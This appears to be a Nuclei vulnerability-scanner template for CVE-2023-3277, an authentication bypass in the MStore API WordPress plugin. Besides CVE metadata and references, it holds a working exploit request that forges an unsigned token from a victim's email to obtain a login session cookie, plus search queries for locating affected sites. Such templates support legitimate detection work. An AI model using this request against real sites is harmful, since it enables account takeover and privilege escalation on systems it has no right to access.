http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"wp_user_id"'
    - '"cookie"'
    - '"user_login"'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-json/api/flutter_user/apple_login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"token":"{{token}}","first_name":"{{firstname}}","last_name":"{{lastname}}"}

    '
id: CVE-2023-3277
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-3277
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.96784
    epss-score: 0.33706
  description: 'The MStore API plugin for WordPress is vulnerable to Unauthorized
    Account Access and Privilege Escalation in versions up to, and including, 4.10.7
    due to improper implementation of the Apple login feature. This allows unauthenticated
    attackers to log in as any user as long as they know the user''s email address.

    '
  impact: 'Attackers can log in as any user and escalate privileges, potentially leading
    to full account compromise.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/mstore-api/"
    framework: wordpress
    max-request: 1
    product: mstore_api
    publicwww-query: /wp-content/plugins/mstore-api/
    vendor: inspireui
    verified: true
  name: MStore API <= 4.10.7 - Unauthorized Account Access and Privilege Escalation
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/1c7c0c35-5f44-488f-9fe1-269ea4a73854?source=cve
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2988788%40mstore-api%2Ftrunk&old=2985882%40mstore-api%2Ftrunk&sfp_email=&sfph_mail=
  - https://plugins.trac.wordpress.org/browser/mstore-api/trunk/controllers/flutter-user.php#L821
  - https://nvd.nist.gov/vuln/detail/CVE-2023-3277
  remediation: 'No patch available yet; monitor for updates from the developer and
    apply patches as soon as they are released.

    '
  severity: critical
  tags: cve,cve2023,wordpress,wp,wp-plugin,inspireui,mstore_api,auth-bypass,vkev
variables:
  email: '{{email}}'
  firstname: '{{rand_base(5)}}'
  lastname: '{{rand_base(5)}}'
  token: '{{concat(".", base64("{\"email\":\"" + email + "\"}"), ".")}}'
